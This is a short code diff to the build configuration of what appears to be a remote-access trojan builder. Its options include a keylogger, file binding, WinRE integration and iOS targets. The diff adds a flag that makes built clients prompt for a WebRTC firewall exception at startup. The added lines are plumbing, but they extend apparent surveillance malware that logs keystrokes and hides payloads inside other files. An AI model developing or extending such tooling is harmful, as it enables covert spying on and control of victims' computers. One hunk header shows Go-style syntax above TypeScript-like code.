@@ -96,6 +96,7 @@ type BuildProcessConfig = {
   noPrinting?: boolean;
   disableKeylogger?: boolean;
   enableWebrtc?: boolean;
+  promptWebrtcFirewallOnStart?: boolean;
   enableWinRE?: boolean;
   builtByUserId?: number;
   initialClientTag?: string;
@@ -1368,6 +1369,7 @@ func runBoundFiles() {
         if (config.noPrinting) baseTags.push("noprint");
         if (config.disableKeylogger) baseTags.push("nokeylogger");
         if (config.enableWebrtc) baseTags.push("goylord_webrtc");
+        if (config.enableWebrtc && config.promptWebrtcFirewallOnStart) baseTags.push("goylord_webrtc_firewall_startup_prompt");
         if (config.enableWinRE && os === "windows") baseTags.push("goylord_winre");
         if (hasBoundFiles) baseTags.push("hasbinder");
         if (isIosTarget) baseTags.push("ios_target");
